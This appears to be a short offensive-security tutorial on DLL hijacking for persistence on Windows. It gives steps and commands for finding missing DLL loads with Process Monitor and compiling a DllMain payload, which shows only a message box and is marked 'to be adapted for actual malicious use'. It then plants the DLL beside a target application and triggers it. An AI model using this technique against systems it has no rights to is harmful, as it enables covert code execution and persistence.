### **ESTABLISHING PERSISTENCE USING DLL HIJACKING**

DLL Hijacking takes advantage of the way Windows applications search for and load Dynamic Link Libraries (DLLs). Here is a detailed explanation of the commands and technical aspects of setting up a DLL Hijacking scenario:

### **STEP 1: IDENTIFYING VULNERABLE APPLICATIONS AND DLLS**

1.  Download and run Process Monitor.
2.  Set up a filter to observe the DLL loading behavior of the target application.
3.  Look for entries that indicate a DLL being searched for but not found, or loaded from a non-specific path.  
    `Filter -> Category -> Path -> contains -> .dll`

### **STEP 2: CREATING THE MALICIOUS DLL**

4.  Write C++ code that performs the desired malicious action when the DLL is loaded. Here’s an example that shows a basic message box when loaded (to be adapted for actual malicious use):
    
    ```c++
    #include <Windows.h>
    
    BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
      switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
          MessageBox(NULL, "DLL has been injected!", "DLL Hijacking", MB_OK);
          break;
      }
      return TRUE;
    } 
    ```
    
5.  Use a command line compiler like MinGW or Visual Studio `cl` command to compile the DLL.  
    `cl /LD MaliciousDll.cpp /Fe:MaliciousDll.dll`
    

### **STEP 3: PLACING THE MALICIOUS DLL**

6.  Depending on the DLL search order and your access rights, place the DLL in a directory that will be searched before the legitimate DLL’s usual directory.
7.  Common locations to test include the application’s directory or directories listed in the system `PATH`.  
    `copy MaliciousDll.dll C:\Path\To\Target\Application\`

### **STEP 4: TRIGGERING THE EXPLOIT**

8.  Simply starting the application normally should trigger the loading of your malicious DLL, if placed correctly.  
    `start "" "C:\Path\To\Target\Application\Application.exe"`

### **STEP 5: MONITORING AND CLEANUP**

9.  Reopen Process Monitor and check for the loading event of your `MaliciousDll.dll`.
10. Ensure that your message box or other indicators of execution appear as expected.
11. Remove the malicious DLL from the directory to prevent further execution and to clean up the environment.  
    `del C:\Path\To\Target\Application\MaliciousDll.dll`